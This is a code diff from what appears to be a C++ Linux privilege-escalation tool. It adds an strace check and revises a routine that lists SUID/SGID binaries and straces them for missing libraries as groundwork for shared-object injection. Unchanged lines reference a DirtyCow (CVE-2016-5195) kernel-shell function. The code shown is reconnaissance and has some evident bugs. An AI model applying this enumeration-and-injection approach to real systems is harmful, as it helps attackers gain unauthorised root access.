@@ -139,8 +139,46 @@ bool CheckIfFileExists(std::string test) {
   }
 }
 
+
+
+bool CheckIfStraceExists(std::string test1) {
+    std::system("which strace > /tmp/strace.txt");
+    std::ifstream stracefile;
+    stracefile.open("/tmp/strace.txt");
+    if (stracefile.is_open())
+    {
+        std::string data; 
+        while(getline(stracefile,data))
+        {
+            if (data.find("strace not found") != std::string::npos)
+            {
+                return false;
+            }
+            else
+            {
+                std::cout << "strace installed" << std::endl;
+                return true;
+            }
+        }
+    }
+    
+    {
+        std::cout << "Unable to open strace file" << std::endl;
+        return false; 
+    }
+
+
+}
+
+
+
+
+
+
+
+
 void DirtyCowCheck(void) {
-  char speechMark = '"';
+  // char speechMark = '"';
 
   struct utsname version;
   int newVersion;
@@ -190,7 +228,7 @@ void DirtyCowCheck(void) {
 }
 
 void kernelShell(void) {
-  char speechMark = '"';
+  // char speechMark = '"';
   std::cout << "Retriving Kernel Shell via CVE 2016-5195(DirtyCow) Exploit"
             << std::endl;
 
@@ -521,31 +559,28 @@ void FindAllsuid(void) {
 
 void sharedObjectLibraryInjection(void) {
 
-  // if yes, then search for missing objects via strace
-  // if no, skip this function
+  // TODO 02/07/2023 - EVERYTHING WORKS. HOWEVER STD::SYSTEM IS TOO SLOW WITH STRACE
+  // IS THERE ANYOTHER WAY TO IMPLEMENT SAME METHOD WITHOUT STD::SYSTEM?
   // create C malware and execute?
-  std::string stracePath = "/usr/bin/strace";
-  CheckIfFileExists(stracePath);
+  std::string stracePath = "usr/bin/strace";
+  CheckIfStraceExists(stracePath);
   // std::cout << "Check file is: " << CheckIfFileExists << std::endl;
 
-  if (CheckIfFileExists(stracePath) == true) {
-    std::cout << "[+] " << stracePath
-              << " Found, Proceeding with Shared Object Library Injection"
-              << std::endl;
-    // strace stuff
-    std::system("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls  "
+  if (CheckIfStraceExists(stracePath) == true) {
+        std::system("rm /tmp/strace.txt");
+        std::cout << "[+] " << stracePath << " Found, Proceeding with Shared Object Library Injection" << std::endl;
+        // strace stuff
+        std::system("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls  "
                 "{} \\; 2> /dev/null > root_files.txt");
-    std::ifstream root_files;
-    root_files.open("root_files.txt");
+        std::ifstream root_files;
+        root_files.open("root_files.txt");
 
-    if (root_files.is_open()) {
-      std::string data;
-      while (getline(root_files, data)) {
+        if (root_files.is_open()) {
+        std::string data;
+        while (std::getline(root_files, data)) {
         // std::cout << "[+] strace " +data+ " 2>&1 | grep -iE \"open|access|no
         // such file\"" << std::endl;
-        std::system(
-            ("strace " + data + " 2>&1 | grep -iE \"open|access|no such file\"")
-                .c_str());
+            std::system(("strace " + data + " 2>&1 | grep -iE \"home\" | grep -iE \"open|access|no such file\"").c_str());
       }
     }
 
